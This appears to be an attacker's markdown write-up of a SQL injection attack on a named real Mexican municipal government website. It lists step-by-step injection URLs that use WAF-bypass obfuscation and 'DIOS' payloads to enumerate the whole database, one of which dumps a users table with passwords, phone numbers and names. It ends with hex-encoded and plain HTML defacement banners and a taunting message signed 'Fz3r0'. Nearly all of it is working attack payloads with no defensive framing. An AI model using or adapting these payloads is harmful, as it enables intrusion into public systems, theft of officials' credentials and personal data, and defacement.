### Dork

- `https[:]//www[.]puertomorelos[.]gob[.]mx/detys[.]php?id=11`

### Injection Vulnerability

- `https://www.puertomorelos.gob.mx/detys.php?id=11--+-`

### Count - WAF Bypass - `order by`

- `https://www.puertomorelos.gob.mx/detys.php?id=11 /*!50000ORDER*//**//*!50000BY*/ 14 --+-`

### Vulnerable Column - WAF bypass - `union select`

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,4,5,6,7,8,9,10,11,12,13,14 --+-`

### Simple Concat Info - WAF Bypass

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,/*!50000cOnCat*/(database(),user(),version()),5,6,7,8,9,10,11,12,13,14 --+-`

### HTML Injection Concat Info PoC - WAF Bypass

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,/*!50000cOnCat*/(0x596f20736f79206c61206e6f636865,0x3c62723e,0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,version()),5,6,7,8,9,10,11,12,13,14 --+-`

### Fz3r0 DIOS - WAF Bypass (El truco está en ofuscar el `concat` y el `from`.... y mucho... mucho encoding... )

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,/*!00000concat*/(0x3c646976207374796c653d22666f6e742d66616d696c793a2027436f7572696572204e6577272c206d6f6e6f73706163653b20666f6e742d73697a653a20373870783b20746578742d736861646f773a307078203170782035707820233030303b20746578742d616c69676e3a2063656e7465723b206261636b67726f756e642d636f6c6f723a20626c61636b3b20636f6c6f723a207265643b223e3c62723e496e6a656374656420627920467a3372303c62723e3c2f666f6e743e3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f53514c692f6d61696e2f4172742f467a3372305f426c61636b2e706e67223e3c62723e3c666f6e7420636f6c6f723d6c696d652073697a653d3370783e5175652065737465206d656e73616a6520686167612065636f20646573646520656c20496e6672616d756e646f2e3c62723e3c666f6e7420636f6c6f723d7265642073697a653d363070783e4461746120426173652050574e65642121213c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d77686974652073697a653d3570783e4e6f6d62726520646520444220203a3c2f666f6e743e3c666f6e7420636f6c6f723d7265642073697a653d3970783e3c62723e,database(),0x3c62723e3c2f666f6e743e3c666f6e7420636f6c6f723d77686974652073697a653d3570783e56657273696f6e2064652044423a3c2f666f6e743e3c666f6e7420636f6c6f723d7265642073697a653d3970783e3c62723e,version(),0x3c62723e3c2f666f6e743e3c666f6e7420636f6c6f723d77686974652073697a653d3570783e41646d696e6973747261646f7220646520444220203a3c2f666f6e743e3c666f6e7420636f6c6f723d7265642073697a653d3970783e3c62723e,user(),0x3c2f666f6e743e3c2f666f6e743e3c666f6e7420636f6c6f723d7265642073697a653d3070783e3c62723e3c62723e3c62723e3c7461626c6520626f726465723d2232223e3c74686561643e3c74723e3c74683e42617365206465204461746f733c2f74683e3c74683e5461626c61733c2f74683e3c74683e436f6c756d6e61733c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f6469763e3c2f74643e3c2f74723e))))x)),5,6,7,8,9,10,11,12,13,14 --+-`

### Fz3r0 DIOS / Databases List Dump - WAF Bypass (El truco está en ofuscar el `concat` y el `from`)

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,(SELECT+(@x)%20/*!00000from*/%20(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)%20/*!00000from*/%20(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=/*!00000concat*/(@x,0x3c666f6e7420636f6c6f723d7265642073697a653d37307078206261636b67726f756e642d636f6c6f723d626c61636b3e436f6e74656f206465204261736573206465204461746f7320656e205365727669646f722050574e6564212121213c62723e3c696d67207372633d68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f53514c692f6d61696e2f4172742f65785f62616c2e706e672077696474683d22323230223e3c62723e3c2f666f6e743e3c666f6e7420636f6c6f723d6c696d652073697a653d333070783e,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e3c62723e3c62723e,0x3c2f666f6e743e))))x),5,6,7,8,9,10,11,12,13,14 --+-`

### Data Dump - WAF Bypass (Using DIOS dumped info) - `Users`

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(_usuarios)WHERE(@x)IN(@x:=/*!00000concat*/(0x20,@x,0x3c666f6e7420636f6c6f723d7265642073697a653d373e5573756172696f20792050617373776f72642050574e65642121213c62723e3c696d67207372633d68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f53514c692f6d61696e2f4172742f6e69672e706e673e3c62723e3c2f666f6e743e3c666f6e7420636f6c6f723d79656c6c6f772073697a653d353e,nom_session,0x3c62723e,0x3a,passw,0x3c62723e,0x3a,id_perfil,0x3c62723e,0x3a,tipo,0x3c62723e,0x3a,cel,0x3c62723e,0x3a,cargo,0x3c62723e,0x3a,nom,0x3c62723e,0x3a,a_p,0x3c62723e,0x3a,a_m,0x3c62723e,0x3c2f666f6e743e,0x3c62723e,0x3c62723e))))x),5,6,7,8,9,10,11,12,13,14 --+-`

---

### Media

- `<img src=https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/AhPuch.jpg/150px-AhPuch.jpg>`
- `<img src=https://latam.aetn.com/THC/noticias/2708.H.N2.Dioses5.JPG>`
- `<div style="font-family: 'Courier New', monospace; font-size: 20px; text-align: center; background-color: black; color: lime;"><br>Mira detras de ti...<br> He dicho, mira detras de ti...<br><br> ?Puedes leer este mensaje? <br>?Puedes escuchar el grito de tu propia alma? <br><br> Elige sabiamente...<br> mi voz revela el futuro,<br> pero tu mente torturada tambien tiene poder. <br><br> ?Cual es tu eleccion? <br>Tu vida, tu futuro... descubrelo.<br><br> No confies en nadie. <br>Solo los mejores prevaleceran.<br> Tienes el derecho de unirte a nosotros.<br> Bienvenido a nuestro oscuro mundo.<br><br> Pronto se abriran las puertas a una nueva dimension.<br><br> 204863.<br> 204864.<br> 204863.<br><br> Camine, camine y no pude hacer otra cosa que caminar sin poder detenerme...<br> Y entonces, me vi caminando frente a mi mismo... <br>Pero no era realmente yo...<br><br> Perdoname, hay un monstruo en mi interior...<br> Puedo escuchar sus llamados desde el Infierno...<br><br> 204863.<br><br> Ya no hay vuelta atras...<br><br>Ten cuidado... La brecha en la puerta...<br> Es una realidad separada. <br>El unico "yo" soy yo. <br>?Estas seguro de que el unico "tu" eres tu?<br><br>En la espesa niebla de la noche tu me podras encontrar<br> Donde las Sombras se mueven y yacen los Demonios<br><br> Yo soy Fz3r0 y el sol no saldra nunca mas.<br><br><br> Has sido elegido<br>.<br>.<br>.<br>.<br>.<br><br></div>`










